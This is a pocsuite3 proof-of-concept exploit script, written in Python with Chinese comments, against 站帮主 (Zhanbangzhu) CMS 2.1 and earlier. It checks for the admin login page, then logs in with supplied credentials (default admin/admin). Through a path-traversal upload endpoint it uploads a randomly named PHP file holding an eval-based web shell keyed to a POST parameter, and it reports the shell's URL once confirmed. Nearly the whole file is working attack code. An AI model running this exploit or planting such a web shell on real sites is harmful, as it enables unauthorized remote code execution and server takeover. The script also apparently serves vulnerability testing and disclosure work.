from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str
from requests_toolbelt.multipart.encoder import MultipartEncoder


class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录ID，如果没有则为0
    version = '1'  # PoC 的版本，默认为1
    author = 'midi'  # PoC 的作者
    vulDate = '2021-7-02'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2022-1-20'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2022-1-20'  # PoC 更新日期 (%Y-%m-%d)
    references = []  # 漏洞来源地址，0day 不用写
    name = '南宁比优网络科技有限公司 站帮主CMS 2.1 后台getshell'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'http://www.zbzcms.com'  # 漏洞厂商主页地址
    appName = '站帮主'  # 漏洞应用名称
    appVersion = '<=2.1'  # 漏洞影响版本
    vulType = 'File Upload'  # 漏洞类型，参见漏洞类型规范表
    desc = '后台无过滤导致任意文件上传getshell'  # 漏洞简要描述
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = '''使用attack时，需要提供用户名和密码，存在多个注入点得到后台密码'''

    def _options(self):
        o = OrderedDict()
        o["username"] = OptString('admin', description='后台用户名')
        o["password"] = OptString('admin', description='后台密码')
        return o

    def _verify(self):
        result = {}
        # payload = "path={0}".format(self.get_option("username"))
        payload2 = "/cms/cms/admin/login.php"
        resp = requests.get(self.url+payload2)
        if resp and resp.status_code == 200 and "if(guanliyuan.length<2 || pwd.length<5){" in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Referer'] = payload2

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        username = self.get_option("username")
        password = self.get_option("password")
        s = requests.session()
        login_data = {
            "guanliyuan": username,
            "pwd": password
        }
        filename = random_str(6) + ".php"
        s.post(url=self.url + "/cms/cms/admin/run_ajax.php?run=login", data=login_data)
        resp2 = s.get(self.url + "/cms/cms/admin/index.php")
        # print(resp2.text)
        if resp2.status_code == 200 and """<li><a href="wenjian.php?path=../../..">""" in resp2.text:
            fileList = [
                ('fileList',
                 ("{}".format(filename), r'''<?php echo "happy day";@eval($_POST["midi"]);?>''', "image/jpeg")), ]
            m = MultipartEncoder(fields=fileList, boundary="-------45962402127348")
            headers = {"content-type": m.content_type}
            s.post(url=self.url + "/cms/cms/include/up.php?run=file&path=../../../&filename=1", data=m,
                   headers=headers)
            if "happy day" in requests.get(url=self.url + "/" + filename).text:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.url + "/" + filename
                result['ShellInfo']['Content'] = '<?php echo "happy day";@eval($_POST["midi"]);?>'

        return self.parse_output(result)




register_poc(DemoPOC)
